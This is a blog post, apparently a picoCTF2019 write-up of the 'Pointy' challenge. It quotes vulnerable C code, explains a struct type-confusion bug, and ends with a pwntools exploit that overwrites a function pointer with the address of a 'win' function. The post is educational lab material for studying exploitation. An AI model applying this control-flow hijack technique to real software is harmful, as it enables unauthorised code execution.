<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Pointy writeup [picoCTF2019] | th3_5had0w</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Pointy writeup [picoCTF2019]" />
<meta name="author" content="th3_5had0w" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pointy (picoCTF2019)" />
<meta property="og:description" content="Pointy (picoCTF2019)" />
<link rel="canonical" href="https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html" />
<meta property="og:url" content="https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html" />
<meta property="og:site_name" content="th3_5had0w" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-10T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pointy writeup [picoCTF2019]" />
<script type="application/ld+json">
{"datePublished":"2021-03-10T00:00:00+00:00","dateModified":"2021-03-10T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html"},"@type":"BlogPosting","url":"https://th3-5had0w.github.io/2021/03/10/pointy-writeup.html","author":{"@type":"Person","name":"th3_5had0w"},"headline":"Pointy writeup [picoCTF2019]","description":"Pointy (picoCTF2019)","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://th3-5had0w.github.io/feed.xml" title="th3_5had0w" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">th3_5had0w<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/th3_5had0w_w"><i class="fab fa-twitter-square"></i></a><a class="color-yellow-hover" href="https://github.com/th3-5had0w"><i class="fab fa-github-square"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="
            https://gravatar.com/avatar/4241e14141109999e63e51ba2f6eac59?s=256
        " class="author-avatar" alt="Avatar" />
    
Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!

</div>


<div class="post">
  <h1 class="post-title">Pointy writeup [picoCTF2019]</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
      <a class="tag" href="/tag/picoCTF2019/">picoCTF2019</a>
      
  </div>
  
  <div class="post-date">Published on 10 Mar 2021</div>
  
  <h1 id="pointy-picoctf2019">Pointy (picoCTF2019)</h1>

<h4 id="what-does-this-program-do">What does this program do?</h4>

<h4 id="it-will-make-a-loop-which-will">It will make a loop which will:</h4>

<h4 id="1-create-a-new-student-struct-and-ask-for-student-name">1. Create a new student struct and ask for student name</h4>

<h4 id="2-create-a-new-professor-struct-and-ask-for-professer-name">2. Create a new professor struct and ask for professer name</h4>

<h4 id="3-search-for-the-student-who-will-give-a-professor-some-point">3. Search for the student who will give a professor some point</h4>

<h4 id="4-search-for-the-professor-who-will-be-given-some-point-by-the-student-chosen-at-step-3">4. Search for the professor who will be given some point by the student chosen at step 3</h4>

<h4 id="5-give-the-professor-point">5. Give the professor point</h4>

<h4 id="we-could-clearly-see-there-are-some-bugs-in-vulnc-right-in-the-first-place">We could clearly see there are some bugs in vuln.c right in the first place</h4>

<pre><code class="language-C">int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN&lt;MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;	//1: student struct was saved in ADDRESSES array
        readLine(student-&gt;name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;  //2: professer struct was also saved in ADDRESSES array
        readLine(professor-&gt;name);
        student-&gt;scoreProfessor=&amp;giveScoreToProfessor; //3: student-&gt;scoreProfessor is a function pointer point to giveScoreToProfessor
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor); //4: struct professor's change depends on retrieveProfessor function
        puts(professor-&gt;name);
        unsigned int value;
            printf("Input the score: \n");
            scanf("%u", &amp;value);
        student-&gt;scoreProfessor(professor, value); //5: point will be given through function scoreProfessor
    }
    return 0;
}
</code></pre>
<h4 id="we-can-now-sense-some-buggy-smell-throught-that-5-place">We can now sense some buggy smell throught that 5 place</h4>

<pre><code class="language-C">struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};
</code></pre>
<h4 id="the-offset-of-student-scoreprofessor-is-the-same-as-professor-lastscore">The offset of Student-&gt;scoreProfessor is the same as Professor-&gt;lastScore</h4>

<pre><code class="language-C">void* retrieveProfessor(char * name ){
    for(int i=0; i&lt;ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])-&gt;name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}
</code></pre>
<h4 id="the-struct-student-and-professor-are-on-the-same-array-but-this-retrieveprofessor-doesnt-check-for-name-if-the-professor-has-the-same-name-as-the-student-this-is-the-critical-bug">The struct student and professor are on the same array, but this <code class="language-plaintext highlighter-rouge">retrieveProfessor</code> doesnt check for name if the professor has the same name as the student, this is the critical bug!</h4>
<h4 id="so-now-if-we-input-a-as-the-student-name-a-as-the-professor-name-a-for-the-student-that-will-give-score-bypass-the-program-check">So now if we input <code class="language-plaintext highlighter-rouge">A</code> as the student name, <code class="language-plaintext highlighter-rouge">A</code> as the professor name, <code class="language-plaintext highlighter-rouge">A</code> for the student that will give score (bypass the program check).</h4>
<h4 id="and-finally-a-as-the-professor-name-the-retrieveprofessor-will-now-try-to-search-professor-named-a-but-the-student-named-a-is-at-the-first-index-of-the-array-so-the-program-will-give-the-professor--struct-variable-the-student-struct-and-then-because-the-offset-of-student-scoreprofessor-is-the-same-as-professor-lastscore-the-program-will-change-the-function-pointer-student-scoreprofessor-to-the-number-of-point-this-was-performed-in-givescoretoprofessor-function-of-struct-student">And finally <code class="language-plaintext highlighter-rouge">A</code> as the professor name, the <code class="language-plaintext highlighter-rouge">retrieveProfessor</code> will now try to search professor named <code class="language-plaintext highlighter-rouge">A</code> but the student named <code class="language-plaintext highlighter-rouge">A</code> is at the first index of the array, so the program will give the <code class="language-plaintext highlighter-rouge">professor</code>  struct variable the <code class="language-plaintext highlighter-rouge">student</code> struct, and then because the offset of <code class="language-plaintext highlighter-rouge">Student-&gt;scoreProfessor</code> is the same as <code class="language-plaintext highlighter-rouge">Professor-&gt;lastScore</code>, the program will change the function pointer <code class="language-plaintext highlighter-rouge">Student-&gt;scoreProfessor</code> to the number of point, this was performed in <code class="language-plaintext highlighter-rouge">giveScoreToProfessor</code> function of struct <code class="language-plaintext highlighter-rouge">student</code>.</h4>

<pre><code class="language-C">void giveScoreToProfessor(struct Professor* professor, int score){
    professor-&gt;lastScore=score; // professor-&gt;lastScore is actually student-&gt;scoreProfessor because the program chose the student struct as professor struct and professor-&gt;lastScore is the same offset as student-&gt;scoreProfessor
    printf("Score Given: %d \n", score);

}
</code></pre>
<p>And i got this final exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">givescore</span><span class="p">(</span><span class="n">student</span><span class="p">,</span> <span class="n">teacher</span><span class="p">,</span> <span class="n">StudentGiveScore</span><span class="p">,</span> <span class="n">teacherBeingGivenScore</span><span class="p">,</span> <span class="n">score</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">student</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">teacher</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">StudentGiveScore</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">teacherBeingGivenScore</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">score</span><span class="p">))</span>

<span class="n">givescore</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'win'</span><span class="p">])</span>
<span class="n">givescore</span><span class="p">(</span><span class="sa">b</span><span class="s">'lmao'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'bruh'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'bruh'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
</code></pre></div></div>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/03/23/starting-my-new-blog.html">
            New blog
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/12/24/dubblesort-writeup.html">
            dubblesort writeup [pwnable.tw]
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/heap-exploit/" class="set-1">heap exploit</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/picoctf2019/" class="set-1">picoCTF2019</a> <a href="/tag/pwn/" class="set-5">pwn</a> <a href="/tag/pwnable.tw/" class="set-1">pwnable.tw</a></div>
  



      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
